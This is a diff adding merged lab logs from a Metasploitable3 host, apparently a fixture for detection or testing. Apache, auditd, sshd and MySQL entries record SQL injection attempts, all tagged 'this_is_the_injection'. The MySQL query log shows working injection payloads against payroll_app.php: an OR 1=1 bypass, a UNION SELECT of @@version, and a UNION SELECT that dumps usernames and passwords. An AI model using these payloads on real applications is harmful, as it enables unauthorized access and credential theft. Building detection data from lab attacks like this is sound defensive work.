@@ -1,0 +1,27 @@
+172.28.128.10 - - [07/Aug/2026:12:46:29 +0000] "GET /?probe=1 HTTP/1.1" 200 844 "-" "this_is_the_injection"
+type=SYSCALL msg=audit(1786106790.914:2239): arch=c000003e syscall=59 success=yes exit=0 a0=7f6dfd4d4050 a1=7f6dfd4dd0f0 a2=7f6dfd4d4090 a3=7f6df9b4afe0 items=2 ppid=2260 pid=3429 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 ses=4294967295 tty=(none) comm="sshd" exe="/usr/sbin/sshd" key="exec_watch"
+type=EXECVE msg=audit(1786106790.914:2239): argc=3 a0="/usr/sbin/sshd" a1="-D" a2="-R"
+type=CWD msg=audit(1786106790.914:2239):  cwd="/"
+type=PATH msg=audit(1786106790.914:2239): item=0 name="/usr/sbin/sshd" inode=2108145 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1786106790.914:2239): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+Aug  7 12:46:37 metasploitable3-ub1404 sshd[3429]: Invalid user this_is_the_injection from 172.28.128.10
+Aug  7 12:46:37 metasploitable3-ub1404 sshd[3429]: input_userauth_request: invalid user this_is_the_injection [preauth]
+Aug  7 12:46:37 metasploitable3-ub1404 sshd[3429]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.28.128.10 
+type=USER_LOGIN msg=audit(1786106797.022:2240): pid=3429 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28756E6B6E6F776E207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1786106797.022:2241): pid=3429 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28696E76616C6964207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+172.28.128.10 - - [07/Aug/2026:12:46:38 +0000] "POST /payroll_app.php HTTP/1.1" 200 747 "-" "this_is_the_injection"
+Aug  7 12:46:38 metasploitable3-ub1404 sshd[3429]: Failed password for invalid user this_is_the_injection from 172.28.128.10 port 53734 ssh2
+type=USER_AUTH msg=audit(1786106798.882:2242): pid=3429 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct="this_is_the_injection" exe="/usr/sbin/sshd" hostname=172.28.128.10 addr=172.28.128.10 terminal=ssh res=failed'
+type=USER_LOGIN msg=audit(1786106798.882:2243): pid=3429 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28696E76616C6964207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+260807 12:46:38	    2 Connect	root@localhost on payroll
+		    2 Query	select username, first_name, last_name, salary from users where username = '' OR 1=1#this_is_the_injection' and password = 'x'
+		    2 Quit	
+172.28.128.10 - - [07/Aug/2026:12:46:43 +0000] "POST /payroll_app.php HTTP/1.1" 200 504 "-" "this_is_the_injection"
+260807 12:46:43	    3 Connect	root@localhost on payroll
+		    3 Query	select username, first_name, last_name, salary from users where username = '' UNION SELECT null, null, null,@@version#this_is_the_injection' and password = 'x'
+		    3 Quit	
+172.28.128.10 - - [07/Aug/2026:12:46:47 +0000] "POST /payroll_app.php HTTP/1.1" 200 990 "-" "this_is_the_injection"
+Aug  7 12:46:47 metasploitable3-ub1404 sshd[3429]: Connection closed by 172.28.128.10 [preauth]
+260807 12:46:47	    4 Connect	root@localhost on payroll
+		    4 Query	select username, first_name, last_name, salary from users where username = '' OR 1=1 UNION SELECT null,null,username,password FROM users#this_is_the_injection' and password = 'x'
+		    4 Quit	
